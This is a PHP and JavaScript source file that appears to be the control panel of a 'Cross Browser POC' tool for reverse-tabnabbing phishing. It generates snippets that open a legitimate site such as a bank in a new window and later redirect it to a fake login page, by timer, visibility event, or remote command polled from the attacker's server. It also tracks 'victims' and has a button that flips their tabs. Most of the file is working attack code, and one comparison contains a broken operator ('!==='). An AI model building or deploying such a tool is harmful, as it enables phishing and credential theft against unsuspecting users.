<?php
	require("./prereq.php");
	if(check_prereq() == false){ exit(); }

// current URL
$s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
$protocol = substr(strtolower($_SERVER["SERVER_PROTOCOL"]), 0, strpos(strtolower($_SERVER["SERVER_PROTOCOL"]), "/")) . $s;
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$address = $protocol . "://" . $_SERVER['SERVER_NAME'] . $port . $_SERVER['REQUEST_URI'];
$parseUrl = parse_url(trim($address));
$parent = (substr($parseUrl['path'], -1) == '/') ? $parseUrl['path'] : dirname($parseUrl['path']) . "/";
$currentUrl = $parseUrl['scheme'] . '://' . $parseUrl['host'] . $port . $parent;

?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet" />
		<script src="//code.jquery.com/jquery-2.1.3.min.js"></script>
		<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
	</head>
	<body>
		<script>
			$(document).ready(function(){
				var expl_timeout_code = '&lt;a href="javascript:void(null)" onclick="exploit()"&gt;link me&lt;/a&gt;<br/>&lt;script&gt;function exploit(){ childWindow= window.open("##ORIGURL##");setTimeout(function(){ childWindow.location.replace("##NEWURL##")}, ##TIMEOUT##); } &lt;/script&gt;';
				var expl_manual_code = '&lt;a href="javascript:void(null)" onclick="exploit()"&gt;link me&lt;/a&gt;<br/>&lt;script&gt;function exploit(){childWindow = window.open("##ORIGURL##"); var x = new XMLHttpRequest(); x.withCredentials=true;x.onreadystatechange=function(){ if(x.readyState==4&&x.status==200){if(x.responseText.split(";")[0]=="1"){ childWindow.location = x.responseText.split(";")[1];}}}; setInterval(function(){x.open("GET","##CONTROL##",true); x.send(); }, 5000); }&lt;/script&gt;';
				var expl_vis_code = '&lt;a href="javascript:void(null)" onclick="exploit()"&gt;link me&lt;/a&gt;<br/>&lt;script&gt;function exploit(){childWindow=window.open("##ORIGURL##"); document.addEventListener("visibilitychanged",function(){ if(false==document.hidden){ childWindow.location.replace("##NEWURL##");}});}&lt;/script&gt;';
				var uniq_code = "";

				$('#newsnippet').on('shown.bs.modal', function () {
					uniq_code = Math.random().toString(36).substring(5);
					console.log(uniq_code);
				});
				
				// empty codes
				$('#newsnippet').on('hidden.bs.modal', function () {
					$("#exploitcode > code").html('');
				});

				function createCode(type){
					var ret = ""
					if(type == "interactive"){ // interactive
						var new_manual_code = expl_manual_code.replace("##ORIGURL##", $("#inputOrigUrl").val());
						new_manual_code = new_manual_code.replace("##CONTROL##", "<?php print $currentUrl ?>status.php?c=" + uniq_code);
						ret = new_manual_code;
					} else if(type == "timed"){ // timeout code
						var new_timeout_code = expl_timeout_code.replace("##ORIGURL##", $("#inputOrigUrl").val());
						new_timeout_code = new_timeout_code.replace("##NEWURL##",  $("#inputNewUrl").val());
						ret = new_timeout_code.replace("##TIMEOUT##",  parseInt($("#inputTimeout").val())*1000);
					} else { // visibility URL
						var new_vis_code = expl_vis_code.replace("##ORIGURL##", $("#inputOrigUrl").val());
						ret = new_vis_code.replace("##NEWURL##",  $("#inputNewUrl").val());
					}
					return ret;
				}
		
				$("body").on("click", "#createCode", function(){
					// check for http in url's
					var hxxp_prefix = /^https?\:\/\/.*/;
					if(!hxxp_prefix.test($("#inputOrigUrl").val()) || !hxxp_prefix.test($("#inputNewUrl").val())){
						$("#exploitcode > #warnings").html('<span class="glyphicon glyphicon-warning-sign"></span> One or more of your URLs does not have a http(s) prefix.').addClass("alert alert-warning");
					} else {
						$("#exploitcode > #warnings").html('').removeClass("alert alert-warning");
					}
					
					$("#exploitcode > code").html(createCode($("input[name=inputType]:checked").val()));
					return false;
				});
	
				$("body").on("click", "#addAttack", function(){
					// add new victim to our DB
					$.post(	"addAttack.php", { o: $("#inputOrigUrl").val(), n: $("#inputNewUrl").val(), c: uniq_code }, function(r){
						if(r == "ok"){
							$('#newsnippet').modal('hide');
						}
					});
				});

				$("body").on("click", ".flip-btn", function(){
          var flipto = $(this).attr("data-flip");
          var prefix = "http://";
          if(flipto.substr(0,prefix.length) !=== prefix){
            flipto = prefix + flipto;
          }
					var a = window.prompt("Do you want to switch " + $(this).attr("data-ip") + " to " + flipto + "?", flipto);
					$.post("doFlip.php", { n: a, i: $(this).attr("data-id") }, function(r){
						if(r == "ok"){
							// exploit was done	
							alert("Exploit done");
						}
					});
				});

				$("body").on("change", "input[name=inputType]", function(){
					if($(this).val() == "timed"){
						// display timeout
					}
					
					if($(this).val() == "interactive"){ }
					$("#exploitcode > code").html("");
				});

				// refresh our table all the time
				setInterval(function(){
					$.get("fetchVictims.php?" + Math.floor(Math.random()*10000), function(r){
						$("#victims").html(r);
					});
				}, 2000);
	
			});

		</script>

		<div class="container">
			<div class="row">
				<h2>Cross Browser POC</h2>
			</div>
			<div class="row">
				<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#newsnippet">New Snippet</button>
			</div>


			<div class="modal fade" role="dialog" id="newsnippet">
				<div class="modal-dialog">
					<div class="modal-content">
						<div class="modal-header">
							<h4 class="modal-title">New Snippet</h4>
						</div>
						<div class="modal-body">
							<div>	
								<form class="form-horizontal">
									<div class="form-group">
										<label for="inputOrigUrl" class="col-sm-3 control-label">Original URL</label>
										<div class="col-sm-9">
											<input type="url" class="form-control exploit-input checkurl" id="inputOrigUrl" placeholder="Ex: https://www.bank.com" />
										</div>
									</div>
									<div class="form-group">
										<label for="inputNewUrl" class="col-sm-3 control-label">New URL</label>
										<div class="col-sm-9">
											<input type="url" class="form-control exploit-input checkurl" id="inputNewUrl" placeholder="Ex: http://www.fakebank.com/login.php" />
										</div>
									</div>
									<div class="form-group">
										<label for="inputType" class="col-sm-3 control-label">Script type</label>
										<div class="col-sm-9">
											<div class="radio">
												<label>
													<input type="radio" name="inputType" id="inputType" value="interactive" checked="checked"/>
													Interactive attack (using XHR)
												</label>
											</div>
											<div class="radio">
												<label>
													<input type="radio" name="inputType" id="inputType" value="timed" />
													Timed attack (using setTimeout())
												</label>
											</div>
											<div class="radio">
												<label>
													<input type="radio" name="inputType" id="inputType" value="visibility" />
													Visibility API attack ("visibilitychanged" event)
												</label>
											</div>
										</div>
									</div>
									<div class="form-group" id="showTimeout">
										<label for="inputTimeout" class="col-sm-3 control-label">Timeout</label>
										<div class="col-sm-3">
											<input type="number" min="1" max="1000" class="form-control exploit-input" id="inputTimeout" placeholder="in seconds, ex: 20" value="10"/>
										</div>
										<div class="col-sm-6">
											Seconds, Only for timeout
										</div>
									</div>
									<div class="form-group" id="showTimeout">
										<div class="col-sm-3"></div>
										<div class="col-sm-9">
											<button class="btn btn-default" id="createCode">Create code</button>
										</div>
									</div>
			
								</form>	
							</div>
							<div id="exploitcode">
								<div id="warnings"></div>
								<code>
								</code>
							</div> <!-- exploitcode -->
						</div> <!-- modal body -->
						<div class="modal-footer">
							<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
							<button type="button" class="btn btn-primary" id="addAttack">Add Attack</button>
						</div>
					</div> <!-- content -->
				</div> <!-- dialog -->
			</div> <!-- modal -->
		
			<div id="victims">
				<div>
					<img src="loader.gif" />
					<p>Loading victims...</p>
				</div>
			</div>

		</div><!-- global container -->
	</body>
</html>

